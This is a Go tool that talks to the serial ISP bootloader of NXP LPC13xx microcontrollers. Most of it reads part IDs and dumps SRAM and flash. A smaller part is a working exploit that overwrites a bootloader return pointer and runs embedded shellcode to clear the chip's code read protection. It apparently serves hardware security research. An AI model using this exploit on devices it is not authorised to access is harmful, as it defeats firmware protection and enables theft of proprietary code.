package main

import (
	"github.com/jacobsa/go-serial/serial"

	"fmt"
	"log"
	"os"
	"strings"

	"bufio"
	"flag"
	"io"
	"strconv"
	"time"
)

//Handy globals
var verbose bool
var portname string
var baudrate uint
var port io.ReadWriteCloser
var scanner *bufio.Scanner

//Calculates the checksum of some bytes.
func checksum(input []byte) uint {
	sum := uint(0)
	for i := 0; i < len(input); i++ {
		sum += uint(input[i])
	}

	//fmt.Printf("Checksum of %d bytes is %d.\n", len(input), sum);

	return sum
}

//Decodes a uuencoded line into bytes.
func uudecode(input string) []byte {
	//fmt.Printf("Input: %s\n", input)

	lenchar := int(input[0]) - 32
	//fmt.Printf("Length: %d bytes\n", lenchar)

	//Output buffer.
	buff := make([]byte, 0)

	//Loop over each character but the first, fetching six bits at a time.
	boffset := 0
	nextbyte := byte(0)

	for i := 1; i < len(input) && lenchar > 0; i++ {
		//Six new bits from this byte.
		newbits := byte(input[i]) - 32
		for j := 0; j < 6; j++ {
			nextbyte = byte((nextbyte << 1) | (newbits >> (5 - j) & 1))
			boffset++

			if boffset == 8 {
				//fmt.Printf("Got byte %02x\n", nextbyte);
				buff = append(buff, nextbyte)
				nextbyte = 0
				boffset = 0

				lenchar--
			}
		}
	}

	//fmt.Printf("Returning %d bytes.\n", len(buff))
	return buff
}

//Encodes bytes into a line.  Does not split lines.
func uuencode(input []byte) string {
	//fmt.Printf("Input: %s\n", input)

	lenchar := len(input)
	//fmt.Printf("Length: %d bytes\n", lenchar)

	//Output buffer.
	buff := []byte{byte(lenchar) + 32}

	//Loop over each bit of the input, adding a char per 6 bits.
	boffset := 0
	nextbyte := byte(0)

	//First we handle all of our input.
	byfour := 0
	for i := 0; i < lenchar; i++ {
		//Eight new bits from this byte.
		newbits := byte(input[i])
		for j := 0; j < 8; j++ {
			nextbyte = byte((nextbyte << 1) | (newbits >> (7 - j) & 1))
			boffset++

			if boffset == 6 {
				//fmt.Printf("Releasing byte %02x\n", nextbyte+32);
				buff = append(buff, nextbyte+32)
				nextbyte = 0
				boffset = 0
			}
		}
		byfour++
	}

	//Then we clean up by handling the remaining, incomplete chunk.
	for boffset != 0 {
		//Eight new bits from this byte.
		newbits := byte(0)
		for j := 0; j < 8; j++ {
			nextbyte = byte((nextbyte << 1) | (newbits >> (7 - j) & 1))
			boffset++

			if boffset == 6 {
				//fmt.Printf("Padding byte %02x\n", nextbyte+32);
				buff = append(buff, nextbyte+32)
				nextbyte = 0
				boffset = 0
			}
		}
		byfour++
	}

	//And finally all spaces become backticks.
	for i := 0; i < len(buff); i++ {
		if buff[i] == 0x20 {
			buff[i] = byte('`')
		}
	}

	//fmt.Printf("Returning %d bytes.\n", len(buff))
	//fmt.Printf("boffest=%d, nextbyte=0x%02x\n", boffset, nextbyte);
	//fmt.Printf("buflen=%d,  byfour=%d\n", len(buff), byfour)

	return string(buff)
}

//Grabs the next line, after waiting a bit.
func nextline(scanner *bufio.Scanner) string {
	//time.Sleep(2e8)
	scanner.Scan()
	S := strings.TrimSpace(string(scanner.Text()))
	if verbose {
		fmt.Printf("RX: <%s>\n", S)
	}
	return S
}

//Writes a string to the port.
func writeline(port io.Writer, s string) error {
	b := []byte(s + "\n")
	_, err := port.Write(b)

	if verbose {
		fmt.Printf("TX: <%s>\n", s)
	}

	//time.Sleep(2e8)
	return err
}

// Branches to an address.  Unlock first.
func G(adr uint32) (major int, minor int) {
	writeline(port, fmt.Sprintf("G %d T", adr&^1))
	nextline(scanner) //Toss the echo
	success, err1 := strconv.Atoi(nextline(scanner))

	if success > 0 || err1 != nil {
		switch success {
		case 0:
			panic("Read error after G().")
		case 15:
			panic("Chip is locked.  Don't forget the -u switch!")
		default:
			panic(fmt.Sprintf("Error %d from G().", success))
		}
	}

	//Return the raw number for other parts.
	return major, minor
}

// Unlocks the chip, required for dangerous commands.
func U() {
	writeline(port, "U 23130")
	nextline(scanner) //Toss the echo.
	success, err1 := strconv.Atoi(nextline(scanner))

	if success > 0 || err1 != nil {
		switch success {
		case 0:
			panic("Read error after U().")
		default:
			panic("Some problem with U().")
		}
	}
}

// Reads the part ID. (J)
func J() string {
	writeline(port, "J")

	j := nextline(scanner)
	success, err1 := strconv.Atoi(nextline(scanner))
	id, err2 := strconv.Atoi(nextline(scanner))

	if strings.Compare(j, "J") != 0 || success > 0 || err1 != nil || err2 != nil {
		panic("Failed to read ID.  (J)")
	}

	// Complete table is from page 336 of UM10375.
	// Not all parts have unique numbers.
	switch id {
	case 742543403:
		return "LPC1311FHN33"
	case 742395947:
		return "LPC1313FHN33"
	case 1023492139:
		return "LPC1342FHN33"
	case 1023410219:
		return "LPC1343FHN33"
	case 404131883:
		return "LPC1311FHN33/01"
	case 405803051:
		return "LPC1313FBD48/01"
	default:
		panic(fmt.Sprintf("Unknown part ID %d.\n", id))
	}

	//Return the raw number for other parts.
	return string(id)
}

// Reads the boot code version. (K)
func K() (major int, minor int) {
	writeline(port, "K")

	k := nextline(scanner)
	success, err1 := strconv.Atoi(nextline(scanner))
	major, err2 := strconv.Atoi(nextline(scanner))
	minor, err3 := strconv.Atoi(nextline(scanner))

	if strings.Compare(k, "K") != 0 || success > 0 || err1 != nil || err2 != nil || err3 != nil {
		panic("Failed to read version.  (K)")
	}

	//Return the raw number for other parts.
	return major, minor
}

// Reads the part ID. (J)
func N() string {
	writeline(port, "N")

	n := nextline(scanner)
	success, err1 := strconv.Atoi(nextline(scanner))
	uid0, err2 := strconv.Atoi(nextline(scanner))
	uid1, err3 := strconv.Atoi(nextline(scanner))
	uid2, err4 := strconv.Atoi(nextline(scanner))
	uid3, err5 := strconv.Atoi(nextline(scanner))
	if strings.Compare(n, "N") != 0 || success > 0 || err1 != nil || err2 != nil || err3 != nil || err4 != nil || err5 != nil {
		panic("Failed to read UID.  (N)")
	}

	//Return the raw number for other parts.
	return fmt.Sprintf("%x %x %x %x", uid0, uid1, uid2, uid3)
}

// Reads bytes from memory. (R)
func R(adr int, count int) []byte {
	/* This command is kinda tricky:

		1. We begin with "R $adr $len\n", which is easy enough.
		2. We then receive up to twenty UU-encoded lines.
	        3. Each line will be up to 61 characters, representing up to 45 bytes.
	        4. Every twenty lines or so, we'll receive a checksum from adding the bytes.
	        5. We must reply with "OK" to the checksum.

	        All addresses and sizes are integer, base 10.  They should be 4-byte aligned.

	*/

	q := fmt.Sprintf("R %d %d", adr, count)
	writeline(port, q)

	r := nextline(scanner)
	if strings.Compare(r, q) != 0 {
		panic(fmt.Sprintf("Received <%s> from an R query.", r))
	}

	result, err := strconv.Atoi(nextline(scanner))
	if err != nil {
		panic("Failed to parse R return code as an integer.")
	}

	//Error codes are on page 337 of UM10375.
	switch result {
	case 0:
		//success, do nothing.
	case 14: //ADDR_NOT_MAPPED
		panic(fmt.Sprintf("Failed to read from 0x%08x.  Address not mapped.\n", adr))
	default:
		panic("Unknown R error code %d.\n")
	}

	//Buffer for our results
	buff := make([]byte, 0)

	done := true
	sum := uint(0)
	for done {
		l := nextline(scanner)
		lenchar := int(l[0]) - 32 //32+actual length
		//fmt.Printf("lenchar=%d, len==%d\n", lenchar, len(l))

		//We have to keep a strict count of bytes, because the
		//protocol doesn't tell us when the tractions have
		//completed.

		if strings.Compare(l, "OK") == 0 {
			// Just a reply to our OK.
			if count == 0 {
				// If there's nothing left, this is the end.
				if verbose {
					fmt.Printf("Received %d bytes.\n", len(buff))
				}
				return buff
			}
		} else if lenchar < len(l) {
			//This is a data line.
			//fmt.Printf("%s\n", l)
			count -= lenchar

			linedata := uudecode(l)
			sum += checksum(linedata)
			adr += len(linedata)

			buff = append(buff, linedata...)
		} else {
			//Grab the checksum, and panic if not a number.
			rsum, err := strconv.Atoi(l)
			if err != nil {
				panic(fmt.Sprintf("Not a checksum in R: <%s>", l))
			}

			if sum != uint(rsum) {
				// We don't panic on this because it's
				// normal when dumping SRAM.
				fmt.Printf("Warning, checksum at 0x%08x should be %d and not %d.  This is normal for SRAM.\n",
					adr, sum, rsum)
			}
			sum = 0
			//Accept the checksum to continue the dump.
			writeline(port, "OK")
		}
	}

	//Return the raw buffer of the data.
	return buff
}

// Gets a working connection to the target, preferably from a reset.
func sync() error {
	// First we write a question mark to initialize the session.
	// This question mark has no return.
	b := []byte{'?'}
	_, err := port.Write(b)
	if err != nil {
		log.Fatalf("port.Write: %v", err)
		return err
	}

	time.Sleep(2e8)
	writeline(port, "Synchronized")

	//First line should be "Synchronized", second line "OK"
	S := nextline(scanner) //Synchronized if new, ?Synchronized if reconnecting
	O := nextline(scanner) //Synchronized if new, 1 if an old session.

	//If we get the magic word, we send it back.
	if strings.Compare(S, "Synchronized") == 0 && strings.Compare(O, "Synchronized") == 0 {
		if verbose {
			fmt.Printf("Connected.\n")
		}

	} else if strings.Compare(S, "?Synchronized") == 0 && strings.Compare(O, "1") == 0 {
		if verbose {
			fmt.Printf("Reconnected.\n")
		}
	} else {
		panic("Synchronization error.")
	}

	//Do an empty transaction to clear the state.
	writeline(port, "R")         //Ought to return 12 for unkown command.
	writeline(port, "something") //Ought to return 1 for illegal command.
	for strings.Compare(nextline(scanner), "1") != 0 {
	}

	return nil
}

// Old main method, but cut out for the flags.
func connect() (io.ReadWriteCloser, *bufio.Scanner) {

	// Set up options.
	options := serial.OpenOptions{
		PortName:        portname, //"/dev/ttyUSB0",
		BaudRate:        baudrate,
		DataBits:        8,
		StopBits:        1,
		MinimumReadSize: 1,
	}

	// Open the port.
	p, err := serial.Open(options)
	port = p
	if err != nil {
		log.Fatalf("serial.Open: %v", err)
	}

	scanner = bufio.NewScanner(port)

	// Synchronize with the target by sending ? and exchanging words.
	sync()

	//Fetch the target and version number.
	targetpart := J()
	major, minor := K()
	uid := N()
	fmt.Printf("Connected to %s, bootloader %d.%d.\nUID=%s\n",
		targetpart, major, minor, uid)

	return port, scanner
}

// Reads memory into a file.
func readtofile(filename string, adr int, count int) {
	fmt.Printf("Reading 0x%x bytes from 0x%08x.\n",
		count, adr)
	data := R(adr, count)

	fmt.Printf("Writing them to %s.\n", filename)
	// Open a new file for writing only
	file, err := os.OpenFile(
		filename,
		os.O_WRONLY|os.O_TRUNC|os.O_CREATE,
		0644,
	)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	// Write bytes to file
	bytesWritten, err := file.Write(data)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("Wrote %d bytes.\n", bytesWritten)
}

//Writes one line of data into an ongoing W command session, returns checksum
func Wline(data []byte) uint {
	if len(data) > 45 {
		panic("Wline() cannot accept more than 45 bytes.")
	}

	//Just one line for now.
	enc := uuencode(data)
	sum := checksum(data)

	writeline(port, enc)
	echo := nextline(scanner)
	if strings.Compare(enc, echo) != 0 {
		panic("Didn't receive an echo to my data write.")
	}

	return sum
}

//Sends many lines of data and their checksums to a W session.
func Wlines(data []byte) {
	//Recursion when too long.
	if len(data) > 900 {
		Wlines(data[0:900])
		Wlines(data[900:])
		return
	}

	//Send all the data we have, 45 bytes at a time, followed by their checksum.
	sum := uint(0)
	j := 0
	for i := 0; i < len(data); i += 45 {
		j += 45
		if j > len(data) {
			j = len(data)
		}

		sum += Wline(data[i:j])
	}

	//Send the checksum.
	writeline(port, fmt.Sprintf("%d", sum))
	nextline(scanner)

	//Hope it's OK, as we don't support resending.
	okay := nextline(scanner)
	if strings.Compare(okay, "OK") != 0 {
		panic("Unexpected response to checksum.")
	}

}

//Writes memory into a file.
func W(adr int, data []byte) {
	/* This is a little complicated:
	   1. First we write "W $adr $len" to begin the transaction, get 0 in return.
	   2. Each line is uuencoded, with a maximum of 45 data bytes.
	   3. Up to twenty lines (450 bytes) go in a set.
	   4. A set is followed by checksum() of all its bytes.
	   5. If the checksum matches, the board sends "OK" and the next set may continue.
	   6. If the checksum doesn't match, the board sends "RESEND" and the set is repeated.
	*/
	cmd := fmt.Sprintf("W %d %d", adr, len(data))
	writeline(port, cmd)

	echo := nextline(scanner)
	success, err1 := strconv.Atoi(nextline(scanner))

	if strings.Compare(echo, cmd) != 0 || success > 0 || err1 != nil {
		switch success {
		case 6:
			panic(fmt.Sprintf("Length 0x%x of write is not 4-byte aligned.", len(data)))
		case 14:
			panic(fmt.Sprintf("Cannot write to 0x%x.", adr))
		default:
			panic("Failed to call W().")
		}
	}

	if verbose {
		fmt.Printf("Writing %d bytes to %08x.\n", len(data), adr)
	}

	Wlines(data)

}

// Exploits the W command to inject the new program counter.
func exploit_setpc(entry int) {
	// Return pointer in W that we'll overwrite.
	pcadr := 0x10001f94

	//Thumb pointers are always odd.
	entry |= 1

	//Poke a return pointer.
	data := []byte{byte(entry & 0xFF), byte((entry >> 8) & 0xFF), byte((entry >> 16) & 0xFF), byte((entry >> 24) & 0xFF)}
	W(pcadr, data)
}

// Execute shellcode to force unlock the chip.
func exploit_unlock() {
	//This should overwrite the RAM copy of the protection word to unlock the chip.
	shellcode := []byte{
		0x80, 0xb5, 0x00, 0xaf, 0x03, 0x4b, 0x00, 0x22, 0x1a, 0x60, 0x00, 0xf0,
		0x05, 0xf8, 0x00, 0x23, 0x18, 0x46, 0x80, 0xbd, 0x84, 0x01, 0x00, 0x10,
		0x5f, 0xf8, 0x00, 0xf0, 0xbd, 0x0f, 0xff, 0x1f, 0xf8, 0xb5, 0x00, 0xbf,
		0xf8, 0xb5, 0x00, 0xbf,
	}

	//Upload the code somewhere above the protection line.
	loadadr := 0x10000300
	W(loadadr, shellcode)

	//Execute it.
	exploit_setpc(loadadr)

	//If we regained control, we should be able to read protected addresses.
	crp := R(0x10000184, 4)
	if crp[0] != 0 || crp[1] != 0 || crp[2] != 0 || crp[3] != 0 {
		panic("Exploit failed, CRP has not been zeroed.")
	}
}

// Tests new features.
func selftest() {
	crp := R(0x10000184, 4)
	fmt.Printf("CRP value is %x\n", crp)

	exploit_unlock()

	crp = R(0x10000184, 4)
	fmt.Printf("CRP value is %x\n", crp)
}

//New main method, using flags for consistency.
func main() {
	verbosePtr := flag.Bool("v", false, "Verbose mode.")
	portPtr := flag.String("p", "/dev/ttyUSB0", "COMM port.")
	baudPtr := flag.Int("r", 57600, "Baud rate.")
	sramdumpPtr := flag.String("sd", "", "Download SRAM to a file.")
	flashdumpPtr := flag.String("fd", "", "Download Flash to a file.")
	goaddrPtr := flag.String("g", "", "Go to address. (0x3CF9)")
	unlockPtr := flag.Bool("u", false, "Unlock.")
	testPtr := flag.Bool("t", false, "Selftest of new features.")
	exploitPtr := flag.Bool("U", false, "Force-unlock the chip with a priveledge escalation exploit.")

	flag.Parse()

	//Update some globals for the connection.
	verbose = *verbosePtr
	portname = *portPtr
	baudrate = uint(*baudPtr)

	//Make our connection.
	connect()
	// Make sure to close it later.
	defer port.Close()

	//Unlock the chip to do dangerous commands.
	if *unlockPtr {
		U()
	}

	//Force-unlock with an exploit.
	if *exploitPtr {
		exploit_unlock()
	}

	//SRAM
	if strings.Compare(*sramdumpPtr, "") != 0 {
		readtofile(*sramdumpPtr, 0x10000000, 1024*8)
	}
	//Flash
	if strings.Compare(*flashdumpPtr, "") != 0 {
		readtofile(*flashdumpPtr, 0x00000000, 1024*32)
	}
	//ROM is forbidden by normal commands, even on unlocked chips.

	//Go to an address?
	if strings.Compare(*goaddrPtr, "") != 0 {
		adr, _ := strconv.ParseInt(*goaddrPtr, 0, 64)
		G(uint32(adr))
	}

	//Self test?
	if *testPtr {
		selftest()
	}
}
